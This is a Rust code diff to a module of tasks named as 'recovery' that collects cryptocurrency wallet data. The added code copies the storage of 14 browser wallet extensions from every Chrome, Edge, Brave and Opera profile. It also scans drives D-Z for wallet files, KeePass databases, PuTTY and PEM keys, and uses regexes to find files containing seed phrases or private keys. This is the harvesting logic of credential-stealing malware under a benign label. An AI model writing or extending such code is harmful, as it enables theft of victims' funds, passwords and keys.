@@ -15,6 +15,7 @@ use walkdir::WalkDir;
 pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     vec![
         Arc::new(CryptoWalletTask::new(ctx)),
+        Arc::new(ExtensionWalletTask::new(ctx)), // New: Browser Extensions
         Arc::new(WalletPatternSearchTask::new(ctx)),
         Arc::new(SeedPhraseDiscoveryTask::new(ctx)),
         wallet_inventory_task(ctx),
@@ -126,11 +127,11 @@ impl RecoveryTask for WalletInventoryTask {
         for spec in &self.specs {
             let mut record = WalletInventoryRecord {
                 label: spec.label.to_string(),
-                roots: spec
-                    .sources
-                    .iter()
-                    .map(|path| path.display().to_string())
-                    .collect(),
+                roots:
+                    spec.sources
+                        .iter()
+                        .map(|path| path.display().to_string())
+                        .collect(),
                 exists: false,
                 file_count: 0,
                 total_bytes: 0,
@@ -168,6 +169,8 @@ impl RecoveryTask for WalletInventoryTask {
     }
 }
 
+// --- Desktop Wallets ---
+
 struct CryptoWalletTask {
     specs: Vec<WalletSpec>,
 }
@@ -183,7 +186,7 @@ impl CryptoWalletTask {
 #[async_trait]
 impl RecoveryTask for CryptoWalletTask {
     fn label(&self) -> String {
-        "Crypto Wallet Data".to_string()
+        "Desktop Wallets".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -229,147 +232,33 @@ pub fn wallet_specs(
     ctx: &RecoveryContext,
 ) -> Vec<(&'static str, Vec<PathBuf>, Vec<PathBuf>, &'static str)> {
     let roaming = &ctx.roaming_data_dir;
-    let local = &ctx.local_data_dir;
     let home = &ctx.home_dir;
 
     vec![
-        (
-            "Ethereum Keystore",
-            vec![roaming.join("Ethereum").join("keystore")],
-            vec![],
-            "Ethereum",
-        ),
-        (
-            "Electrum Wallets",
-            vec![roaming.join("Electrum").join("wallets")],
-            vec![],
-            "Electrum",
-        ),
-        (
-            "Atomic LevelDB",
-            vec![roaming.join("atomic").join("Local Storage").join("leveldb")],
-            vec![],
-            "Atomic",
-        ),
-        (
-            "Exodus",
-            vec![],
-            vec![roaming.join("Exodus").join("exodus.wallet")],
-            "Exodus",
-        ),
-        (
-            "Jaxx LevelDB",
-            vec![
-                roaming
-                    .join("com.liberty.jaxx")
-                    .join("IndexedDB")
-                    .join("file__0.indexeddb.leveldb"),
-            ],
-            vec![],
-            "Jaxx",
-        ),
-        (
-            "Coinomi",
-            vec![roaming.join("Coinomi").join("Coinomi").join("wallets")],
-            vec![],
-            "Coinomi",
-        ),
-        (
-            "Guarda LevelDB",
-            vec![roaming.join("Guarda").join("Local Storage").join("leveldb")],
-            vec![],
-            "Guarda",
-        ),
-        (
-            "Zephyr",
-            vec![roaming.join("Zephyr").join("wallets")],
-            vec![],
-            "Zephyr",
-        ),
+        ("Ethereum", vec![roaming.join("Ethereum").join("keystore")], vec![], "Ethereum"),
+        ("Electrum", vec![roaming.join("Electrum").join("wallets")], vec![], "Electrum"),
+        ("Atomic", vec![roaming.join("atomic").join("Local Storage").join("leveldb")], vec![], "Atomic"),
+        ("Exodus", vec![], vec![roaming.join("Exodus").join("exodus.wallet")], "Exodus"),
+        ("Jaxx", vec![roaming.join("com.liberty.jaxx").join("IndexedDB").join("file__0.indexeddb.leveldb")], vec![], "Jaxx"),
+        ("Coinomi", vec![roaming.join("Coinomi").join("Coinomi").join("wallets")], vec![], "Coinomi"),
+        ("Guarda", vec![roaming.join("Guarda").join("Local Storage").join("leveldb")], vec![], "Guarda"),
+        ("Zephyr", vec![roaming.join("Zephyr").join("wallets")], vec![], "Zephyr"),
         ("Armory", vec![roaming.join("Armory")], vec![], "Armory"),
-        (
-            "Bytecoin",
-            vec![roaming.join("bytecoin")],
-            vec![],
-            "Bytecoin",
-        ),
+        ("Bytecoin", vec![roaming.join("bytecoin")], vec![], "Bytecoin"),
         ("Zcash", vec![roaming.join("Zcash")], vec![], "Zcash"),
-        ("DashCore", vec![roaming.join("DashCore")], vec![], "Dash"),
-        (
-            "Monero",
-            vec![home.join("Documents").join("Monero").join("wallets")],
-            vec![],
-            "Monero",
-        ),
-        (
-            "Bitcoin Core",
-            vec![roaming.join("Bitcoin")],
-            vec![],
-            "Bitcoin",
-        ),
-        (
-            "Litecoin Core",
-            vec![roaming.join("Litecoin")],
-            vec![],
-            "Litecoin",
-        ),
-        (
-            "Dogecoin Core",
-            vec![roaming.join("Dogecoin")],
-            vec![],
-            "Dogecoin",
-        ),
-        ("Raven Core", vec![roaming.join("Raven")], vec![], "Raven"),
-        (
-            "MultiBit HD",
-            vec![roaming.join("MultiBitHD")],
-            vec![],
-            "MultiBit",
-        ),
-        (
-            "Wasabi Wallet",
-            vec![roaming.join("WalletWasabi").join("Client").join("Wallets")],
-            vec![],
-            "Wasabi",
-        ),
-        (
-            "Daedalus Wallet",
-            vec![roaming.join("Daedalus Mainnet").join("wallets")],
-            vec![],
-            "Daedalus",
-        ),
+        ("Dash", vec![roaming.join("DashCore")], vec![], "Dash"),
+        ("Monero", vec![home.join("Documents").join("Monero").join("wallets")], vec![], "Monero"),
+        ("Bitcoin", vec![roaming.join("Bitcoin")], vec![], "Bitcoin"),
+        ("Litecoin", vec![roaming.join("Litecoin")], vec![], "Litecoin"),
+        ("Dogecoin", vec![roaming.join("Dogecoin")], vec![], "Dogecoin"),
+        ("Raven", vec![roaming.join("Raven")], vec![], "Raven"),
+        ("MultiBit", vec![roaming.join("MultiBitHD")], vec![], "MultiBit"),
+        ("Wasabi", vec![roaming.join("WalletWasabi").join("Client").join("Wallets")], vec![], "Wasabi"),
+        ("Daedalus", vec![roaming.join("Daedalus Mainnet").join("wallets")], vec![], "Daedalus"),
         ("Yoroi", vec![roaming.join("Yoroi")], vec![], "Yoroi"),
-        (
-            "Terra Station",
-            vec![roaming.join("Terra Station")],
-            vec![],
-            "Terra",
-        ),
-        (
-            "Sparrow Wallet",
-            vec![roaming.join("Sparrow").join("wallets")],
-            vec![],
-            "Sparrow",
-        ),
+        ("Terra", vec![roaming.join("Terra Station")], vec![], "Terra"),
+        ("Sparrow", vec![roaming.join("Sparrow").join("wallets")], vec![], "Sparrow"),
         ("Binance", vec![roaming.join("Binance")], vec![], "Binance"),
-        (
-            "MetaMask Desktop",
-            vec![local.join("MetaMask").join("Local Storage").join("leveldb")],
-            vec![],
-            "MetaMask",
-        ),
-        (
-            "Ronin Desktop",
-            vec![local.join("Ronin").join("Local Storage").join("leveldb")],
-            vec![],
-            "Ronin",
-        ),
-        (
-            "Phantom Desktop",
-            vec![local.join("Phantom").join("Local Storage").join("leveldb")],
-            vec![],
-            "Phantom",
-        ),
     ]
 }
 
@@ -384,6 +273,102 @@ fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
         })
         .collect()
 }
+
+// --- Browser Extension Wallets ---
+
+struct ExtensionWalletTask {
+    local_app_data: PathBuf,
+}
+
+impl ExtensionWalletTask {
+    fn new(ctx: &RecoveryContext) -> Self {
+        Self {
+            local_app_data: ctx.local_data_dir.clone(),
+        }
+    }
+}
+
+const EXTENSION_IDS: &[(&str, &str)] = &[
+    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+    ("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"),
+    ("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+    ("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
+    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
+    ("Pontem", "phkbamefinggmakgklpkljjmgibnpglj"),
+    ("Sui", "opcgpfmipidbgpenhmajoajpbobppdil"),
+    ("Martian", "efbglgofoippbgcjepnhiblaibcnclgk"),
+    ("Petra", "ejjladinnckdgjemekebdpeokbikhfci"),
+    ("BitKeep", "jiidiaalihmmhddjgbnbhljjczhozign"),
+    ("Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+    ("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
+];
+
+const BROWSER_PATHS: &[(&str, &str)] = &[
+    ("Chrome", "Google\\Chrome\\User Data"),
+    ("Edge", "Microsoft\\Edge\\User Data"),
+    ("Brave", "BraveSoftware\\Brave-Browser\\User Data"),
+    ("Opera", "Opera Software\\Opera Stable"),
+    ("OperaGX", "Opera Software\\Opera GX Stable"),
+];
+
+#[async_trait]
+impl RecoveryTask for ExtensionWalletTask {
+    fn label(&self) -> String {
+        "Extension Wallets".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Wallets
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+
+        for (browser_name, relative_path) in BROWSER_PATHS {
+            let user_data = self.local_app_data.join(relative_path);
+            if !user_data.exists() {
+                continue;
+            }
+
+            // Check Default and Profile * folders
+            let mut profiles = vec![user_data.join("Default")];
+            if let Ok(mut entries) = fs::read_dir(&user_data).await {
+                while let Ok(Some(entry)) = entries.next_entry().await {
+                    if let Ok(name) = entry.file_name().into_string() {
+                        if name.starts_with("Profile") {
+                            profiles.push(entry.path());
+                        }
+                    }
+                }
+            }
+
+            for profile in profiles {
+                let extensions_dir = profile.join("Local Extension Settings");
+                if !extensions_dir.exists() {
+                    continue;
+                }
+
+                for (wallet_name, ext_id) in EXTENSION_IDS {
+                    let ext_path = extensions_dir.join(ext_id);
+                    if ext_path.exists() {
+                        let label = format!("Ext_{}_{}", browser_name, wallet_name);
+                        let dest_root = wallet_output_dir(ctx, &label).await?;
+                        
+                        // Copy the LevelDB folder
+                        copy_dir_limited(&ext_path, &dest_root, &label, &mut artifacts, usize::MAX, 0).await?;
+                    }
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+
+// --- Pattern & Seed Discovery ---
 
 struct WalletPatternSearchTask {
     user_roots: Vec<PathBuf>,
@@ -402,6 +387,7 @@ impl WalletPatternSearchTask {
         user_roots.retain(|p| p.exists());
 
         let mut drive_roots = Vec::new();
+        // Simple heuristic: check drives D-Z
         for b in b'D'..=b'Z' {
             let drive = format!("{}:\\", b as char);
             let path = PathBuf::from(&drive);
@@ -421,10 +407,12 @@ const TARGET_PATTERNS: &[&str] = &[
     "wallet.dat",
     "default_wallet",
     "UTC--",
-    ".kdbx",
+    ".kdbx", // KeePass
     ".key",
     ".pem",
-    ".ppk",
+    ".ppk", // Putty Private Key
+    "wallet.json",
+    ".wallet",
 ];
 
 const IGNORED_DIRS: &[&str] = &[
@@ -438,6 +426,9 @@ const IGNORED_DIRS: &[&str] = &[
     "node_modules",
     ".git",
     "target",
+    "npm-cache",
+    ".cargo",
+    ".rustup",
 ];
 
 #[async_trait]
@@ -457,12 +448,12 @@ impl RecoveryTask for WalletPatternSearchTask {
 
         for root in &self.user_roots {
             let root = root.clone();
-            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 5)));
+            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 10))); // Deep scan user dirs
         }
 
         for root in &self.drive_roots {
             let root = root.clone();
-            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 3)));
+            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 4))); // Shallow scan drives
         }
 
         for handle in handles {
@@ -491,7 +482,10 @@ fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
         }
         let name = entry.file_name().to_string_lossy();
         if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
-            found.push(entry.path().to_path_buf());
+            // Additional check: skip if file size > 50MB (likely not a wallet)
+            if entry.metadata().map(|m| m.len()).unwrap_or(0) < 50 * 1024 * 1024 {
+                found.push(entry.path().to_path_buf());
+            }
         }
     }
     found
@@ -524,7 +518,7 @@ impl SeedPhraseDiscoveryTask {
 #[async_trait]
 impl RecoveryTask for SeedPhraseDiscoveryTask {
     fn label(&self) -> String {
-        "Seed Phrase Discovery".to_string()
+        "Seed & Key Discovery".to_string()
     }
 
     fn category(&self) -> RecoveryCategory {
@@ -535,12 +529,17 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
         let mut artifacts = Vec::new();
         let dest_root = wallet_output_dir(ctx, "Seeds").await?;
 
+        // 12-24 word BIP39 phrase
         let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
-        let seed_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet"];
+        // Private Key (Basic Heuristic: 64 hex chars or WIF-like starts with 5, L, K)
+        let priv_key_regex = Regex::new(r"\b([a-fA-F0-9]{64})|([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b").unwrap();
+        
+        let target_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet", "secret", "private", "key", "pass"];
+        let target_exts = [".txt", ".doc", ".docx", ".pdf", ".rtf", ".md", ".json", ".log"];
 
         for root in &self.roots {
             let walker = WalkDir::new(root)
-                .max_depth(3)
+                .max_depth(5)
                 .follow_links(false)
                 .into_iter()
                 .filter_entry(|e| !is_ignored(e));
@@ -551,29 +550,31 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
                 }
 
                 let path = entry.path();
-                let name = path
+                let name_lower = path
                     .file_name()
                     .unwrap_or_default()
                     .to_string_lossy()
                     .to_lowercase();
 
+                // Check extension
+                let has_target_ext = target_exts.iter().any(|&ext| name_lower.ends_with(ext));
+                if !has_target_ext {
+                     continue;
+                }
+                
                 let mut should_grab = false;
 
-                if name.ends_with(".txt")
-                    || name.ends_with(".doc")
-                    || name.ends_with(".docx")
-                    || name.ends_with(".pdf")
-                {
-                    if seed_names.iter().any(|&s| name.contains(s)) {
-                        should_grab = true;
-                    }
+                // 1. Filename heuristic
+                if target_names.iter().any(|&s| name_lower.contains(s)) {
+                    should_grab = true;
                 }
 
-                if !should_grab && name.ends_with(".txt") {
+                // 2. Content Scan (only for small text-like files)
+                if !should_grab && (name_lower.ends_with(".txt") || name_lower.ends_with(".md") || name_lower.ends_with(".log") || name_lower.ends_with(".json")) {
                     if let Ok(meta) = fs::metadata(path).await {
-                        if meta.len() < 1024 * 10 {
+                        if meta.len() < 1024 * 50 { // < 50KB
                             if let Ok(content) = fs::read_to_string(path).await {
-                                if bip39_regex.is_match(&content) {
+                                if bip39_regex.is_match(&content) || priv_key_regex.is_match(&content) {
                                     should_grab = true;
                                 }
                             }
